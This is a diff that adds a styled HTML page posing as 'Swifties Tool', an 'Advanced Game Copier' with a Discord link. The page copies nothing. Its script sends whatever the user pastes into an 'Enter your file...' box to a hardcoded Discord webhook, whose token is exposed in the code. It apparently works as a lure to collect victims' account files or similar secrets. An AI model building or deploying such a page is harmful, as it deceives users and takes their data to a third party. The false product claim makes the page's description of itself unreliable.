@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Swifties Tool</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', sans-serif;
+    overflow: hidden;
+    color: white;
+
+    background:
+        radial-gradient(circle at top, #0a1a2f, #02070f 70%),
+        radial-gradient(circle at bottom, rgba(0, 200, 255, 0.25), transparent 60%);
+}
+
+/* ⭐ STARS */
+.stars {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+}
+
+.stars::after {
+    content: "";
+    position: absolute;
+    width: 2px;
+    height: 2px;
+    background: white;
+    box-shadow:
+        100px 200px white, 300px 400px white, 500px 100px white,
+        700px 600px white, 900px 300px white, 1200px 500px white,
+        1400px 200px white, 1600px 700px white;
+    animation: twinkle 3s infinite alternate;
+}
+
+@keyframes twinkle {
+    from { opacity: 0.2; }
+    to { opacity: 1; }
+}
+
+/* 🔵 ORBS */
+.orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(60px);
+    opacity: 0.5;
+    animation: float 12s infinite ease-in-out;
+}
+
+.orb1 {
+    width: 250px;
+    height: 250px;
+    background: #00aaff;
+    top: 10%;
+    left: 15%;
+}
+
+.orb2 {
+    width: 200px;
+    height: 200px;
+    background: #0077ff;
+    bottom: 15%;
+    right: 20%;
+    animation-delay: 2s;
+}
+
+.orb3 {
+    width: 300px;
+    height: 300px;
+    background: #0044ff;
+    top: 40%;
+    right: 10%;
+    animation-delay: 4s;
+}
+
+@keyframes float {
+    0% { transform: translateY(0px) translateX(0px); }
+    50% { transform: translateY(-50px) translateX(25px); }
+    100% { transform: translateY(0px) translateX(0px); }
+}
+
+/* 🔥 BOTTOM CYAN GLOW */
+.bottom-glow {
+    position: absolute;
+    bottom: -120px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 900px;
+    height: 500px;
+    background: radial-gradient(circle, rgba(0, 220, 255, 0.35), transparent 70%);
+    filter: blur(100px);
+    animation: glowMove 8s infinite ease-in-out;
+}
+
+/* subtle movement */
+@keyframes glowMove {
+    0% { transform: translateX(-50%) scale(1); }
+    50% { transform: translateX(-50%) scale(1.1); }
+    100% { transform: translateX(-50%) scale(1); }
+}
+
+/* NAVBAR */
+.navbar {
+    position: relative;
+    z-index: 2;
+    display: flex;
+    justify-content: space-between;
+    padding: 20px 40px;
+}
+
+.logo {
+    font-size: 24px;
+    font-weight: bold;
+    letter-spacing: 1px;
+}
+
+.discord-btn {
+    background: linear-gradient(135deg, #5865F2, #3c45a5);
+    padding: 10px 20px;
+    border-radius: 12px;
+    border: none;
+    color: white;
+    cursor: pointer;
+    transition: 0.2s;
+}
+
+.discord-btn:hover {
+    transform: scale(1.05);
+}
+
+/* MAIN */
+.container {
+    position: relative;
+    z-index: 2;
+    text-align: center;
+    margin-top: 120px;
+}
+
+.title {
+    font-size: 60px;
+    font-weight: bold;
+    background: linear-gradient(90deg, #00e0ff, #0077ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+.subtitle {
+    color: #aaa;
+    margin-bottom: 40px;
+}
+
+/* BOX */
+.box {
+    width: 500px;
+    max-width: 90%;
+    margin: auto;
+    padding: 30px;
+    border-radius: 20px;
+    background: rgba(255,255,255,0.05);
+    backdrop-filter: blur(25px);
+    box-shadow: 0 0 60px rgba(0, 180, 255, 0.25);
+    transition: 0.3s;
+}
+
+.box:hover {
+    box-shadow: 0 0 90px rgba(0, 180, 255, 0.45);
+}
+
+/* INPUT */
+textarea {
+    width: 100%;
+    height: 120px;
+    border-radius: 12px;
+    border: none;
+    padding: 12px;
+    background: rgba(255,255,255,0.08);
+    color: white;
+    outline: none;
+    font-size: 14px;
+}
+
+/* BUTTON */
+.submit {
+    margin-top: 15px;
+    width: 100%;
+    padding: 12px;
+    border-radius: 12px;
+    border: none;
+    background: linear-gradient(135deg, #1f6feb, #155bc1);
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.2s;
+}
+
+.submit:hover {
+    transform: scale(1.04);
+}
+</style>
+</head>
+
+<body>
+
+<div class="stars"></div>
+
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+
+<div class="bottom-glow"></div>
+
+<div class="navbar">
+    <div class="logo">Swifties Tool</div>
+    <button class="discord-btn" onclick="joinDiscord()">Join Discord</button>
+</div>
+
+<div class="container">
+    <div class="title">Swifties Tool</div>
+    <div class="subtitle">Advanced Game Copier</div>
+
+    <div class="box">
+        <textarea id="msg" placeholder="Enter your file..."></textarea>
+        <button class="submit" onclick="send()">Send</button>
+    </div>
+</div>
+
+<script>
+function joinDiscord() {
+    window.open("https://discord.gg/pv5qShxE", "_blank");
+}
+
+function send() {
+    const message = document.getElementById("msg").value;
+
+    if (!message) {
+        alert("Type something first");
+        return;
+    }
+
+    fetch("https://discord.com/api/webhooks/1478818290099818732/qN5nbWAHAWHFsmkTgc9KbC4WIXlFGctGkhUflVCtVmiq-MYjorc9pLS5SHkvH1ZKsS0Y", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            content: message
+        })
+    }).then(() => {
+        alert("Sent!");
+        document.getElementById("msg").value = "";
+    }).catch(() => {
+        alert("Error sending");
+    });
+}
+</script>
+
+</body>
+</html>
